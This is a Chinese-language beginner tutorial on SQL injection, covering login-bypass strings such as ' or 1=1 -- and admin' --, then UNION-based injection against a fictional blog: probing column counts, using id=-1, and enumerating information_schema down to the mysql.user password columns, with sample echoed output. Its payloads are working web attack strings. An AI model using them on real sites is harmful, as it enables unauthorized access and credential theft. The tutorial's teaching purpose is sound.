上文中，笔者对字符型和数字型sql注入进行了简叙，同时引入了闭合和利用回显判断错误的概念。
看起来非常简单，不过，真实的应用场景中，手动注入sql是一件很烦扰的事情。下面我们引入更有难度的一些知识。
从逻辑判断角度理解万能密码
万能密码其实在现在这个年代没什么用。互联网的世界已经不是小明的2003年了。
上sql语句：
SELECT *FROM users WHERE username = '输入的用户名'AND passwd='输入的密码'
正常的情况下
无非是两个登录框，网页使用者输入用户密码，比如admin和admin123
如果攻击者获得了admin但是不知道密码：
用户名输入admin'--,密码输入随便一个什么。这样直接就可以登陆成功。
（没看懂的看第一篇）
使用逻辑关系
如果用户名和密码都不知道怎么办？
用户名：HAHAHA'OR 1=1 OR '1'='1'
密码：   XIXI
易得到，拼接之后的sql语句变成了
SELECT *FROM admin WHERE username= 'HAHAHA'OR 1=1 OR '1'='1'AND password = 'XIXI'
在sql语句之中，逻辑运算符的优先级是NOT>AND>OR
同一个优先级则默认从左到右运算。那么现在看看语句会怎么执行
没有NOT，先看AND，‘1’=‘1’AND password='XIXI','1'='1'肯定是对的，密码XIXI大概率要错喔。（可以乱写一串长一点的，不然被前端校验给ban的话，多少也有点尴尬。）
然后语句可以化简为username = '1' OR 1=1 OR FALSE，username = '1'应该FALSE 1=1肯定对，原句变成了FALSE OR TRUE OR FALSE
显然最后TRUE了
这里默认读者具有一定或且非的离散数学或者高中数学知识，不再解释。
接下来有一些类似的万能密码
（1）基础注入
' or 1=1 --
' or '1'='1
' or 1=1 #
' or 1=1/*
' or ''='
' or 'a'='a
' or 1=1; --
admin' --
admin' or '1'='1' --
道理都一样，与或非，请看第一个例子
（3）注释符注入
' or 1=1 --
' or 1=1 #
' or 1=1/*
admin' --
admin' #
假设有一个简单的登录验证 SQL 语句，用于验证用户输入的用户名和密码是否匹配数据库中的记录，其代码如下
SELECT * FROM users WHERE username = '$input_username' AND password = '$input_password';
其中，$input_username是从登录表单获取的用户名输入，$input_password是密码输入。
用户名输入 ' or 1=1/*     这里的/*表示注释符的开始，不会执行后面的语句，密码可以随意输入，例如输入 abc
将上述输入内容拼接到原始 SQL 语句中，会得到如下结果：
SELECT * FROM users WHERE username = '' or 1=1/*' AND password = 'abc';
原本的 SQL 查询需要同时验证用户名和密码是否匹配才能返回结果，但经过注入后，查询条件变成了恒为真的情况。这样，无论数据库中是否存在与输入的用户名和密码匹配的记录，该 SQL 查询都会返回 users表中的所有记录。
读者读到这里，会发现和上一篇讲的差不多嘛，半天下来也没什么新奇。
确实，万能密码的作用是让你再次过一遍上一篇目讲的，同时多看一些例子。
这里只要笔者愿意，大可以洋洋洒洒的给所有的万能密码列举完。不过作为新手向，我们要细嚼慢咽。
接下来讲解一下Union联合注入的知识。
我们掌握了最简单的闭合逻辑，字符串拼接和逻辑判断，接下来进入基于union语句的查询：
首先是union的用法，先上三个构造的union句子
' or 1=1 UNION SELECT null, database(), null --
' or 1=1 UNION SELECT null, user(), null --
' or 1=1 UNION SELECT null, @@version, null --
看不懂union怎么办？莫慌，看看如何详解
一、UNION的基本作用‌
UNION操作符用于合并两个或多个SELECT语句的结果集，它会自动去除重复的行。其主要作用是将来自不同表或查询的相关数据组合成一个统一的结果集。
二、UNION语法结构‌
SELECT column1, column2 FROM table1 UNION SELECT column1, column2 FROM table2;
使用这句话，就能一下查出两个句子
三、UNION与UNION ALL的区别‌
UNION‌：自动去除重复记录，性能相对较低
UNION ALL‌：保留所有记录包括重复项，执行效率更高
四、使用注意事项‌
排序操作只能在最后一个SELECT语句中使用ORDER BY
可以在各个SELECT语句中使用WHERE条件进行筛选
确保各查询结果的列顺序完全一致
考虑性能影响，在不需要去重时优先使用UNION ALL
五、示例说明‌
例如，需要同时查询员工表和离职员工表中的所有姓名：
SELECT name FROM employees UNION SELECT name FROM former_employees;
这将返回所有不重复的员工姓名，包括在职和离职人员。
好了，相信读者已经了解了基础的union用法。
假设存在一个简单的登录验证 SQL 语句，用于验证用户输入的用户名和密码是否匹配数据库中的记录，如下所示
SELECT * FROM users WHERE username = '$input_username' AND password = '$input_password';
其中，$input_username是从登录表单获取的用户名输入，$input_password是密码输入。
用户名输入 ' or 1=1 UNION SELECT null, database(), null --，密码可以随意输入，例如 random_password。
将上述输入内容拼接到原始 SQL 语句中，得到
SELECT * FROM users WHERE username = '' or 1=1 UNION SELECT null, database(), null --' AND password = 'random_password';
如何解读这句话：
我们先需要掌握一些sql语言本身的自带函数：
在Union联合注入中，你用到的 group_concat()、information_schema 系列表（schemata、tables、columns）以及 table_schema 等，是枚举数据库结构（库、表、列）的核心工具。
它们的作用类似于“数据库的地图”，帮助你从“不知道任何信息”逐步定位到目标数据（如用户密码）。下面逐一详细解释：
一、group_concat()：将多行结果“合并成一行”的函数
在SQL查询中，默认情况下，SELECT 语句会将每条匹配的记录单独作为一行返回。但在Union注入中，由于页面通常只显示一行结果（你的payload中用 1,XXX,3,4,5,6,7 对应回显列，只有一个位置显示数据），如果结果是多行，就会被截断或只显示第一条。
group_concat(字段名) 的作用是：将查询到的多行结果，按逗号分隔合并成一个字符串，放在一行中返回，刚好适配Union注入的“单行回显”场景。
示例：假设 information_schema.schemata 中有3个数据库：hotel、mysql、test，直接查询：
SELECT schema_name FROM information_schema.schemata;
cmd中将返回
hotel
mysql
test
而用 group_concat() 后：
SELECT group_concat(schema_name) FROM information_schema.schemata;
会合并成一行返回
hotel,mysql,test
这样你的payload才可以把爆的库都显示出来。
二、information_schema：MySQL的“系统元数据库”
information_schema 是MySQL自带的系统数据库，它不存储实际业务数据，而是存储了整个MySQL服务器的“元数据”（即“数据的数据”），包括：
所有数据库的名称；
每个数据库包含的表名；
每个表包含的列名（字段名）；
列的数据类型、权限等信息。
这就像一个“数据库的目录”，你可以通过查询它来获取整个数据库的结构，而Union注入的核心目标之一就是通过它枚举结构，最终获取敏感数据（如用户表的账号密码）。

三、information_schema.schemata：存储“所有数据库名”的表
information_schema.schemata 是 information_schema 中的一个表，专门存储MySQL服务器中所有数据库的名称，其中最关键的字段是schema_name（即数据库名）。
作用：枚举所有数据库
你的payload union select 1,group_concat(schema_name),3,... from  information_schema.schemata 就是通过查询这个表，获取了所有数据库名
（hotel,information_schema,mysql,performance_schema）。可以理解为：schemata 表是“数据库的清单”，schema_name 是清单上的“数据库名称”。
举例子： 获取所有数据库
注入语句-1 union select 1,group_concat(schema_name),3,4,5,6,7 from information_schema.schemata
回显将为# hotel,information_schema,mysql,performance_schema
四、information_schema.tables：存储“所有表名”的表。information_schema.tables 存储了MySQL中所有表的信息，包括表属于哪个数据库、表名
是什么等。关键字段有：
table_schema：表所属的数据库名（与 schemata.schema_name 对应）；
table_name：表的名称。
作用：枚举某个数据库下的所有表。当你知道数据库名后（比如 hotel），可以通过 where table_schema='数据库名' 过滤，只查询该数据库下的表。
你的payload union select 1,group_concat(table_name),3,... from information_schema.tables where table_schema= 'hotel' 就是这个逻辑：指定查询 hotel 数据库下的表，最终得到 room 表。
举例子：获取hotel数据库的表名
-1 union select 1,group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema= 'hotel'
回显将为# room
五、table_schema：定位表所属数据库的“标识字段”
table_schema 是 information_schema.tables 和 information_schema.columns 表中的一个字段，用于表示当前记录（表或列）所属的数据库名。
它的作用类似于“标签”：
在 information_schema.tables 中，table_schema='hotel' 表示“这是 hotel 数据库下的表”；
在 information_schema.columns 中，table_schema='mysql' 表示“这是 mysql 数据库下的列”。
通过 where table_schema='目标数据库名'，可以精准过滤出你关心的数据库中的表或列，避 免查询到其他无关数据库的信息。
举例子：# 获取mysql数据库的表名
-1 union select 1,group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema= 'mysql
回显将为：#
column_stats,columns_priv,db,event,func,general_log,gtid_slave_pos,help_category,he
lp_keyword,help_relation,help_topic,host,index_stats,innodb_index_stats,innodb_tabl
e_stats,plugin,proc,procs_priv,proxies_priv,roles_mapping,servers,slow_log,table_st
ats,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition
,time_zone_transition_type,user
六、information_schema.columns：存储“所有列名”的表
information_schema.columns 存储了MySQL中所有列（字段）的信息，关键字段有：
table_schema：列所属的数据库名；
table_name：列所属的表名；
column_name：列的名称（字段名）。
作用：枚举某个表下的所有列
当你知道数据库名和表名后（比如 mysql 数据库的 user 表），可以通过 where table_schema=
'数据库名' and table_name='表名' 过滤，查询该表下的所有列。
你的payload union select 1,group_concat(column_name),3,... from information_schema.columns where table_name= 'user' 就是查询 user 表的所有列，得到 Host,User,Password,... 等字段（这些是MySQL用户表的核心字段，包含登录账号和密码）。
举例子：
# 获取user表的列名
-1 union select 1,group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name= 'user'
回显将为：#
Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop
_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,I
ndex_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv
,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Crea
te_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_
tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_upda
tes,max_connections,max_user_connections,plugin,authentication_string,password_expi
red,is_role,default_role,max_statement_time
总结一下，以上几个函数，在Union注入中是协作的
你的整个注入过程，本质上是通过这些工具从“未知”到“已知”的逐步枚举，流程如下：
1. 用 information_schema.schemata + group_concat(schema_name) → 获取所有数据库名（如 hotel、mysql）；
2. 用 information_schema.tables + where table_schema='目标库' +
group_concat(table_name) → 获取目标数据库的表名（如 hotel 库的 room 表，mysql库的 user 表）；
3.用 information_schema.columns + where table_schema='目标库' and table_name='目标表'+ group_concat(column_name) → 获取目标表的列名（如 user 表的 User、Password
列）；
4. 最后直接查询目标列的数据（如 select user,password from mysql.user）→ 得到敏感信息。
这整个过程就像“查字典”：先查所有“字典名”（数据库），再查某个字典里的“章节名”
（表），再查章节里的“关键词”（列），最后找到关键词对应的“内容”（数据）。
接下来，我们来模拟一个场景：
小明想要再次攻破一个博客网站，并且指定使用union联合注入的方法。他想先嗅探一下这个表到底是什么东西。
URL头为https://website.thu/article?id=1
小明先测https://website.thu/article?id=1‘
回显报错了，坐实sql注入漏洞存在
小明再测 https://website.thu/article?id=1 UNION SELECT 1
回显报错，说UNION SELECT语句与原始SELECT查询的列数不同。
小明再测 https://website.thu/article?id=1 UNION SELECT 1,2
报错一样
小明再测 https://website.thu/article?id=1 UNION SELECT 1，2，3
成功了，错误信息已经消失，文章正在显示，但现在我们想显示我们的数据而不是这篇文章。
文章之所以会显示，是因为网站代码中的某个地方获取了返回的第一个结果并将其展示出来。
为了解决这个问题，小明需要让第一个查询不产生任何结果。只需将文章ID从1改为0就能轻
松做到这一点。
到这里，读者可能会大为困惑。切莫着急，我且说来：
article?id=1 里的article是一个mysql数据库中的表。而一个表可能有多少列是不知道的。
在union语句中，union select后面的列数和数据内容和前面要保持严格的一致。
两个查询返回的「列数」完全相等，且每一列的「数据类型」能兼容（比如左边是数字列，右边也得是数字 / 可转数字的类型）。
为什么SELECT *from where article id=1 union select 1会报错，我们为啥又要这样写呢？
这个问题的核心原因是 **`UNION` 操作符的语法规则限制**——它要求左右两个查询返回的 **结果集结构完全一致**，包括「列数必须相同」和「对应列的数据类型兼容」。你遇到的报错，本质是「左右列数不匹配」导致的。


### 先把基础逻辑讲透：`UNION` 到底要求什么？
`UNION` 的作用是「合并两个独立查询的结果集」，数据库要把两个结果集上下拼接，就必须满足一个前提：  
**两个查询返回的「列数」完全相等，且每一列的「数据类型」能兼容（比如左边是数字列，右边也得是数字/可转数字的类型）**。/
举个生活例子：你要把两堆“盒子”叠在一起，左边一堆是3个盒子（对应3列），右边一堆只有1个盒子（对应1列），根本没法对齐拼接——数据库也是这个道理，列数不匹配就直接报错。
### 回到你的注入语句，一步步分析报错原因
你的原始语句（简化后）是：
```sql
SELECT * FROM article WHERE id = 1 UNION SELECT 1;
```
我们拆成两部分看：
#### 1. 左边查询（原查询）的列数
`SELECT * FROM article WHERE id = 1` 中的 `*` 表示「查询 `article` 表的所有列」。  
假设 `article` 表有 **3列**（比如 `id`、`title`、`content`），那么左边查询返回的结果集是「3列数据」（列数=3）。
#### 2. 右边查询（注入的 `UNION SELECT`）的列数
你写的 `UNION SELECT 1` 只返回「1列数据」（列数=1）。
#### 3. 报错的本质
左边3列 ≠ 右边1列，违反了 `UNION` 的列数匹配规则，数据库会直接抛出错误（比如 MySQL 会报 `The used SELECT statements have a different number of columns`）。
### 为什么要改成 `SELECT 1,2,3`？
不是必须写 `1,2,3`，而是要让「右边查询的列数 = 左边查询的列数」！
- 如果 `article` 表有3列，右边就需要返回3列——`SELECT 1,2,3` 只是最简洁的写法（用任意数字、字符串都可以，比如 `SELECT 'a','b','c'`，只要列数对、数据类型兼容）；
- 如果 `article` 表有4列，就需要写成 `SELECT 1,2,3,4`，否则还是会报错；
- 注入时写 `1,2,3` 的核心目的是「探测原表的列数」：从 `SELECT 1` 开始试，报错就加一个数（`1,2`），再报错就再加（`1,2,3`），直到不报错——此时就知道原表的列数等于你写的数字个数。
### 补充：数据类型兼容的小细节（避免踩坑）
除了列数，对应列的「数据类型」也要能兼容：
- 比如左边第一列是 `id`（整数类型），右边第一列就不能写 `SELECT 'abc',2,3`（字符串无法转整数），否则会报错；
- 用 `1,2,3` 最安全，因为数字可以兼容大多数数据类型（字符串列会自动把数字转成字符串显示）。
### 总结
- 报错原因：`UNION` 要求左右查询列数一致，你写的 `SELECT 1` 列数不够；
- `SELECT 1,2,3` 不是固定写法，只是「匹配原表列数」的简洁方案；
- 注入时这么写的目的：探测原表列数，为后续获取数据库信息（比如查 `version()`、`database()`）做铺垫。
然而，union的故事并没有结束。
现在小明确定了article是一个具有三列的表，他输入，- 1 union select 1,database(),3，小明让前面的数据为- 1，那前面的内容就没有显示出来，返回的反而是我后面查询到的内容，为什么前面不是报错呢（肯定没有id=-1的文章啊），为什么后面的会显示出来
1. 原始查询为什么不报错？
假设原始的 SQL 语句可能是类似 SELECT 列1,列2,...,列7 FROM 表 WHERE id=参数（因为
你后续 UNION SELECT 有7列，说明原始查询也是7列，否则会报错）。
当你将“参数”改为 -1 时，原始查询变成了 SELECT 列1,列2,...FROM 表 WHERE id=-1。
这个语句本身是 语法正确的（没有违反 SQL 语法规则），数据库会正常执行它。只是如果你的表中 没有 id=-1 的记录，那么这个查询会返回 空结果集（即没有任何行），而不是报错。
数据库报错的场景通常是“语法错误”（如列数不匹配、关键字错误）或“逻辑错误”（如
除数为0），而“查询条件没有匹配到数据”是正常的执行结果（空集），不会报错。
2. 为什么最终显示的是后面 UNION SELECT 的内容？
UNION 操作符的作用是 合并两个结果集，并去除重复行（UNION ALL 则保留重复行）。合并的规则是：
如果第一个结果集有数据（多行），第二个结果集有数据，最终会显示“第一个结果集 + 第二个结果集”的所有行；
如果第一个结果集是空集（如你这里 id=-1 没有匹配到数据），第二个结果集有数据，最终会只显示“第二个结果集”的行。
小明的场景属于后者：
原始查询（id=-1）返回空集，而 UNION SELECT 1,database(),3 是一个有效的查询（3列，与原始查询列数一致），会返回一行数据（例如 1, 数据库名,3）。
因此，UNION 合并后的结果集就是这一行数据，应用程序在显示结果时，自然就只展示了这行来自 UNION SELECT 的内容。
总结
原始查询不报错：因为 id=-1 是合法条件，只是无匹配数据，返回空集（正常执行结果）；
显示 UNION SELECT 结果：因为原始查询为空集，UNION 合并后只剩下注入查询的结果，被应用程序返回。
这也是联合注入中常用的技巧：通过让原始查询返回空集（如 id=-1、id=0 等不存在的条件），确保注入的 UNION SELECT 结果能被清晰地显示出来。
铺垫都到这了，接下来，结合上文的所有内容，下一篇我们讲述彻底的渗透链.
